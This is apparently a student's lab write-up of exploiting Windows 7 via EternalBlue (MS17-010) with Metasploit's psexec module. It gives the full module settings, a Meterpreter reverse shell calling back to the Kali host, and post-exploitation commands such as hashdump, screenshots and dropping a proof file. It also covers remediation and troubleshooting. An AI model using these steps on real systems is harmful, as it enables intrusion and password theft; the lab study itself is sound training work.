# 🔴 Penetration Test Write-Up: Windows 7 — EternalBlue (MS17-010) Exploitation

**Author:** Anush  
**Date:** March 12, 2026  
**Difficulty:** Beginner  
**Target:** Windows 7 Ultimate SP1 x86 (32-bit)  
**Attacker Machine:** Kali Linux  
**Lab:** Local VirtualBox Environment  
**Result:** ✅ Meterpreter Shell Obtained  

---

## ⚠️ Legal Disclaimer

> This attack was performed in a **private, isolated lab environment** using Oracle VirtualBox.  
> Windows 7 was set up as an **intentionally vulnerable test machine** for security training.  
> **Never perform these techniques on any system you do not own or do not have explicit written permission to test.**  
> Unauthorised computer access is illegal in Australia under the Cybercrime Act 2001.

---

## 📋 Table of Contents

1. [Lab Setup](#️-lab-setup)
2. [The Story Behind EternalBlue](#-the-story-behind-eternalblue)
3. [Attack Overview](#️-attack-overview)
4. [Phase 1 — Network Setup](#-phase-1--network-setup)
5. [Phase 2 — Reconnaissance with Nmap](#-phase-2--reconnaissance-with-nmap)
6. [Phase 3 — Exploitation with Metasploit](#-phase-3--exploitation-with-metasploit)
7. [Phase 4 — Post Exploitation](#-phase-4--post-exploitation)
8. [Troubleshooting — What Went Wrong and How I Fixed It](#-troubleshooting--what-went-wrong-and-how-i-fixed-it)
9. [What I Learned](#-what-i-learned)
10. [Commands Reference](#-commands-reference)
11. [Real World Relevance](#-real-world-relevance)

---

## 🖥️ Lab Setup

| Component | Details |
|---|---|
| Virtualisation Platform | Oracle VirtualBox |
| Attacker Machine | Kali Linux |
| Target Machine | Windows 7 Ultimate SP1 (32-bit) |
| Network Type | NAT Network (isolated — named NatNetwo) |
| Attacker IP | 10.0.2.15 |
| Target IP | 10.0.2.6 |

### Why This Setup Is Safe

Both machines run inside VirtualBox on a private NAT Network. No traffic leaves the host computer. The internet cannot reach these machines. Only Kali and Windows 7 can talk to each other — nobody outside can access them.

```
Your Ubuntu computer
└── VirtualBox
    ├── Kali Linux (10.0.2.15) ← attacker
    └── Windows 7  (10.0.2.6) ← target
        (completely isolated from internet)
```

### Pre-Attack Configuration On Windows 7

Before the attack, two settings were changed on Windows 7 to replicate a real world vulnerable machine:

```
1. Windows Firewall → Turned OFF
   (Many real companies had misconfigured firewalls in 2017)

2. File and Printer Sharing → Turned ON
   (Required for the named pipe delivery method)
```

### 📸 Screenshot

<img width="1854" height="1046" alt="image" src="https://github.com/user-attachments/assets/65fb76a0-173f-4c66-87c2-38e8d8326000" />


---

## 📖 The Story Behind EternalBlue

Understanding the history makes this vulnerability hit differently.

```
2013 → NSA discovers a secret bug deep inside Windows
       The bug lives in SMB — the file sharing service
       They name their exploit: EternalBlue
       They keep it secret and use it as a cyberweapon for years

2017 March → Microsoft releases patch MS17-010
             fixing the vulnerability

2017 April → A hacker group called Shadow Brokers
             steals NSA hacking tools
             and dumps them publicly on the internet
             EternalBlue is now available to anyone

2017 May → Criminal hackers combine EternalBlue
           with ransomware and create WannaCry

Within 24 hours of WannaCry release:
→ 200,000 computers infected
→ 150 countries hit
→ UK NHS hospitals shut down — operations cancelled
→ Telefonica Spain completely taken down
→ FedEx, Renault, Russian banks all hit
→ $4 billion in total damages worldwide
```

Every company that had applied the MS17-010 patch in March 2017 was safe. Every company that had not — got destroyed.

Your Windows 7 VM has never been patched. It has this exact vulnerability right now.

---

## 🗺️ Attack Overview

```
Phase 1 → Set up network so Kali and Windows 7 can talk
Phase 2 → Scan Windows 7 to find what services are running
Phase 3 → Exploit EternalBlue through port 445 (SMB)
Phase 4 → Use Meterpreter to prove full system access
```

---

## 📡 Phase 1 — Network Setup

### The Problem

By default VirtualBox machines cannot talk to each other. They need to be on the same virtual network.

### The Fix — Create a NAT Network

```
VirtualBox → File → Preferences → Network → NAT Networks
→ Click + to add new network
→ Name: NatNetwo
→ IP Prefix: 10.0.2.0/24
→ Enable DHCP: checked
→ Click OK
```

Then set BOTH Kali and Windows 7 to use this network:

```
Each VM → Settings → Network → Adapter 1
→ Attached to: NAT Network
→ Name: NatNetwo
```

### Verify They Can Communicate

On Kali:

```bash
ping 10.0.2.6 -c 4
```

### 📸 Screenshot

<img width="834" height="681" alt="image" src="https://github.com/user-attachments/assets/3b301357-ea9f-43bf-a45f-64c0c309df5b" />


---

## 🔍 Phase 2 — Reconnaissance with Nmap

### What and Why

Before attacking anything, find out what services Windows 7 is running and what versions they are. Every service version can be matched against known vulnerabilities.

### Command

```bash
nmap -sV 10.0.2.6
```

### Output

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0
```

### The Key Finding

```
445/tcp  open  microsoft-ds  Microsoft Windows 7
```

**Port 445 = SMB = the exact port EternalBlue attacks.**

SMB (Server Message Block) is the Windows file sharing service. EternalBlue exploits a memory corruption bug inside this service to execute arbitrary code as SYSTEM.

Nmap also revealed:
```
Host: ENIGMA-PC
OS: Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)
```

This told us the machine is 32-bit — critical information that affected which payload we used.

### 📸 Screenshot

<img width="834" height="681" alt="image" src="https://github.com/user-attachments/assets/40c23902-e3ae-42e1-8d94-2da97521d3d5" />


---

## 💥 Phase 3 — Exploitation with Metasploit

### Step 1 — Open Metasploit

```bash
msfconsole
```

### 📸 Screenshot

<img width="857" height="720" alt="image" src="https://github.com/user-attachments/assets/4ca70cbe-c46b-44c9-88d1-f3cf66153013" />


---

### Step 2 — Load The Exploit Module

```bash
use exploit/windows/smb/ms17_010_psexec
```

**Why psexec and not eternalblue?**

There are two EternalBlue modules in Metasploit:

| Module | Supports |
|---|---|
| ms17_010_eternalblue | 64-bit targets only |
| ms17_010_psexec | Both 32-bit AND 64-bit |

Our Windows 7 is 32-bit so we use psexec. Same vulnerability — different delivery method.

---

### Step 3 — Set The Target

```bash
set RHOSTS 10.0.2.6
```

RHOSTS = the IP address of Windows 7 we want to attack.

---

### Step 4 — Set The Payload

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

**What is Meterpreter?**

```
Basic shell:       Meterpreter shell:
────────────       ──────────────────
type commands      type commands
see output         see output
               +   take screenshots
               +   dump all passwords
               +   upload/download files
               +   see running processes
               +   runs entirely in memory
                   (harder to detect)
```

**What is reverse_tcp?**

```
Normal connection:  You reach OUT to target → target opens door
Reverse shell:      Target reaches BACK to you → bypasses firewall
```

Reverse shells bypass firewalls because firewalls block incoming connections but allow outgoing ones.

---

### Step 5 — Set Your Kali IP

```bash
set LHOST 10.0.2.15
```

LHOST = YOUR Kali IP. The target needs to know where to connect back to.

---

### Step 6 — Set Windows Credentials

```bash
set SMBUser enigma
set SMBPass Password123
```

**Why did we need credentials?**

The psexec delivery method uses Windows named pipes to deliver the payload. Named pipes require authentication. In a real engagement you would:

```
Step 1: Run initial EternalBlue exploit
Step 2: Dump password hashes from memory
Step 3: Crack hashes with Hashcat
Step 4: Use cracked passwords here
```

We skipped steps 1-3 because we already knew the lab credentials.

---

### Step 7 — Verify All Settings

```bash
show options
```

```
RHOSTS   → 10.0.2.6                         ✅
RPORT    → 445                               ✅
LHOST    → 10.0.2.15                         ✅
PAYLOAD  → windows/meterpreter/reverse_tcp   ✅
SMBUser  → enigma                            ✅
```

---

### Step 8 — Fire The Exploit

```bash
exploit
```

**Output:**

```
[*] Started reverse TCP handler on 10.0.2.15:4444
[*] 10.0.2.6:445 - Target OS: Windows 7 Ultimate 7601 Service Pack 1
[*] Sending stage to 10.0.2.6
[*] Meterpreter session 1 opened

meterpreter >
```

That `meterpreter >` prompt means we are inside Windows 7. 🎉

### 📸 Screenshot

<img width="857" height="720" alt="image" src="https://github.com/user-attachments/assets/2a862cd3-552b-4df9-924b-7d4631d81969" />


---

## 🏴 Phase 4 — Post Exploitation

### Confirm Identity and Privilege

```bash
getuid
```

**Output:**
```
Server username: NT AUTHORITY\SYSTEM
```

SYSTEM is the highest privilege level on any Windows machine — higher than Administrator. Complete control over the entire system.

### 📸 Screenshot

> *[INSERT SCREENSHOT — getuid showing NT AUTHORITY\SYSTEM]*

---

### Get System Information

```bash
sysinfo
```

Shows computer name, Windows version, architecture, and domain.

### 📸 Screenshot

> *[INSERT SCREENSHOT — sysinfo output]*

---

### Dump All Password Hashes

```bash
hashdump
```

Extracts every Windows account password hash stored on the machine. In a real engagement these hashes would be:

```
Option 1: Cracked offline using Hashcat → reveals plaintext password
Option 2: Used directly in Pass-The-Hash attacks → no cracking needed
```

### 📸 Screenshot

> *[INSERT SCREENSHOT — hashdump output showing password hashes]*

---

### Take a Screenshot Of Their Screen

```bash
screenshot
```

Takes a live photo of whatever is currently showing on the Windows 7 screen. The victim has no idea this is happening.

### 📸 Screenshot

> *[INSERT SCREENSHOT — screenshot command result showing Windows 7 desktop]*

---

### Drop Into Windows Shell and Leave Proof

```bash
shell
```

Now inside a real Windows command prompt:

```cmd
echo You have been pwned by Anush - EternalBlue - March 2026 > C:\pwned.txt
type C:\pwned.txt
```

### 📸 Screenshot

> <img width="857" height="720" alt="image" src="https://github.com/user-attachments/assets/18039194-dc03-457f-be00-833f989b3e0d" />


---

## 🔧 Troubleshooting — What Went Wrong and How I Fixed It

This section is important. Real hacking never works first try. Here is every problem I hit and how I solved it.

---

### Problem 1 — Ping Failing (100% packet loss)

```
Symptom: ping 10.0.2.6 → 0 packets received
Cause:   Windows Firewall blocking ICMP ping requests by default
Fix:     Control Panel → Windows Firewall → Turn off Windows Firewall
```

**Lesson:** Windows blocks ping by default as a security measure. In real pentests you use other techniques like TCP SYN scanning to detect hosts even when ping is blocked.

---

### Problem 2 — Wrong Payload Architecture

```
Symptom: "This module only supports x64 (64-bit) targets"
Cause:   Used windows/x64/meterpreter payload on a 32-bit machine
Fix:     Switched from ms17_010_eternalblue to ms17_010_psexec module
         Used windows/meterpreter/reverse_tcp (no x64 in name)
```

**Lesson:** Always confirm target architecture before choosing payload. Nmap told us x86 (32-bit) — we just missed it initially.

---

### Problem 3 — Named Pipe Not Accessible

```
Symptom: "Unable to find accessible named pipe"
Cause:   File sharing was disabled on Windows 7
Fix:     Control Panel → Network and Sharing Center
         → Turn on file and printer sharing
```

**Lesson:** The psexec delivery method requires SMB file sharing to be enabled. Many real targets have this enabled for legitimate business use — which is exactly why EternalBlue spread so fast in 2017.

---

### Problem 4 — Administrator Account Disabled

```
Symptom: STATUS_ACCOUNT_DISABLED error
Cause:   Default Microsoft test VM has Administrator account disabled
Fix:     Used the actual account name (enigma) instead of Administrator
```

**Lesson:** Never assume default credentials. Always enumerate real account names first.

---

## 📚 What I Learned

### Technical Skills Demonstrated

| Skill | Tool Used |
|---|---|
| Virtual network configuration | VirtualBox NAT Network |
| Port scanning and service detection | Nmap -sV |
| Exploit module selection | Metasploit search |
| Architecture-aware payload selection | Metasploit payloads |
| Remote code execution | ms17_010_psexec module |
| Post-exploitation enumeration | Meterpreter |
| Real world troubleshooting | Multiple error fixes |

### Key Concepts Understood

**EternalBlue** — A memory corruption vulnerability in Windows SMB that allows remote code execution without any user interaction. Developed by the NSA, leaked in 2017, weaponised into WannaCry ransomware.

**Meterpreter** — An advanced in-memory payload that gives attackers a feature-rich shell running entirely in RAM. Never touches the hard drive making it harder to detect by antivirus.

**Reverse Shell** — The target machine connects back to the attacker rather than the attacker connecting to the target. Bypasses firewalls which typically block incoming but allow outgoing connections.

**Payload Architecture Matching** — The payload must match the target's CPU architecture. 64-bit payloads fail on 32-bit systems and vice versa. Always confirm architecture during reconnaissance.

**Named Pipes** — Internal Windows communication channels used by the psexec delivery method. Require file sharing to be enabled and valid credentials to access.

---

## 📖 Commands Reference

| Command | Purpose |
|---|---|
| `ping <IP> -c 4` | Test network connectivity |
| `nmap -sV <IP>` | Scan ports and detect service versions |
| `msfconsole` | Open Metasploit Framework |
| `use exploit/windows/smb/ms17_010_psexec` | Load EternalBlue psexec module |
| `set RHOSTS <IP>` | Set target IP address |
| `set PAYLOAD windows/meterpreter/reverse_tcp` | Set 32-bit Meterpreter payload |
| `set LHOST <IP>` | Set attacker IP for callback |
| `set SMBUser <user>` | Set Windows username |
| `set SMBPass <pass>` | Set Windows password |
| `show options` | Verify all settings before firing |
| `exploit` | Execute the attack |
| `getuid` | Check current user on compromised machine |
| `sysinfo` | Get system information |
| `hashdump` | Extract all password hashes |
| `screenshot` | Capture live screenshot of target screen |
| `shell` | Drop into Windows command prompt |

---

## 🌍 Real World Relevance

**What a real pentest report would say:**

```
Finding:     Critical — Remote Code Execution via EternalBlue MS17-010
CVE:         CVE-2017-0144
CVSS Score:  9.3 (Critical)
Impact:      Unauthenticated remote SYSTEM access to target workstation
Proof:       NT AUTHORITY\SYSTEM confirmed via Meterpreter session
Remediation: Apply Microsoft patch MS17-010 immediately.
             Enable automatic Windows Updates.
             Restrict SMB port 445 at network perimeter firewall.
             Disable SMBv1 protocol across all systems.
```

**Why this matters in 2026:**

Even today thousands of unpatched Windows 7 machines exist worldwide. Windows 7 reached end of life in January 2020 — meaning no more security patches from Microsoft. Any organisation still running Windows 7 is permanently vulnerable to EternalBlue with no official fix coming.

**Salary range for roles using these skills in Australia:**

| Role | Salary (AUD) |
|---|---|
| Junior Penetration Tester | $80,000 — $110,000 |
| Security Analyst | $75,000 — $100,000 |
| Red Team Operator | $120,000 — $160,000 |

---

## 🔗 References

- [CVE-2017-0144 — EternalBlue](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Metasploit ms17_010_psexec Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec/)
- [WannaCry Ransomware Analysis](https://www.malwarebytes.com/wannacry)

---

## 👤 About The Author

This write-up was completed as part of a self-directed ethical hacking and penetration testing study program.

**Completed exploits so far:**
- Metasploitable 2 — vsftpd 2.3.4 backdoor (root shell)
- Metasploitable 2 — Samba usermap_script (reverse shell)
- Metasploitable 2 — SSH brute force with Hydra
- Windows 7 — EternalBlue MS17-010 (SYSTEM shell) ← this write-up

**Lab environment:** Oracle VirtualBox — Kali Linux + Metasploitable 2 + Windows 7  
**Currently studying:** CompTIA Security+ SY0-701, TryHackMe, OverTheWire Bandit

---

*This write-up is for educational purposes only. All testing was performed in an isolated lab environment. No real systems were involved.*
